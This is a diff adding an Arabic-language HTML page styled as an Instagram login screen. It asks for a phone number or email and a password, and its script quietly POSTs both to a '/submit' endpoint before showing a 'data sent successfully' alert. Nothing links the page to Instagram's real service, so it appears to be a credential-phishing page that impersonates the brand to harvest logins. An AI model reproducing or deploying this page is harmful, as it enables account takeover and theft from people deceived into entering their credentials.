@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى Instagram</title>
+</head>
+<body>
+    <h1>تسجيل الدخول إلى Instagram</h1>
+    <form id="loginForm">
+        <label for="contact">رقم الهاتف أو البريد الإلكتروني:</label><br>
+        <input type="text" id="contact" name="contact"><br>
+        <label for="code">الرمز السري:</label><br>
+        <input type="password" id="code" name="code"><br><br>
+        <input type="submit" value="إرسال">
+    </form>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const contact = document.getElementById('contact').value;
+            const code = document.getElementById('code').value;
+
+            fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ contact, code })
+            }).then(response => {
+                if (response.ok) {
+                    alert('تم إرسال البيانات بنجاح.');
+                } else {
+                    alert('فشل في إرسال البيانات.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
